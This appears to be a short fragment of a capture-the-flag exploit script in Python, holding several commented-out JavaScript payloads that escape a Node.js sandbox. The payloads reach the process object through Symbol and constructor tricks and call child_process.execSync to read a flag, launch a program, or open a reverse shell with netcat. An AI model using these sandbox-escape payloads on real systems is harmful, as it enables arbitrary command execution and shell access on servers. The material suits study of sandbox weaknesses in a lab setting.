...
def writeCmd(pie):
    ...
    # for i in range(20):
    #     exploit.append(str(i))
    # exploit.append("(function (...a){  return a.map(char=>char.charCodeAt(0)).join(' '); console.log('hack');})")
    

    # payload = 'Symbol = { get toStringTag(){throw f=>f.constructor("return process")()}};try{Buffer.from(new Map());}catch(f){Symbol = {};f(()=>{}).mainModule.require("child_process").execSync("/readflag > /app/static/flag.txt").toString();}'
    # payload1 = 'Symbol = { get toStringTag(){throw f=>f.constructor("return process")()}};try{Buffer.from(new Map());}catch(f){Symbol = {};f(()=>{}).mainModule.require("child_process").execSync("calc").toString();}'
    ...
    # payload3 = 'const process = this.constructor.constructor("return this.process")();process.mainModule.require("child_process").execSync("calc")'

    # payload4 = 'const process = this.constructor.constructor("return this.process")();process.mainModule.require("child_process").execSync("nc 127.0.0.1 6666 -e /bin/sh")'
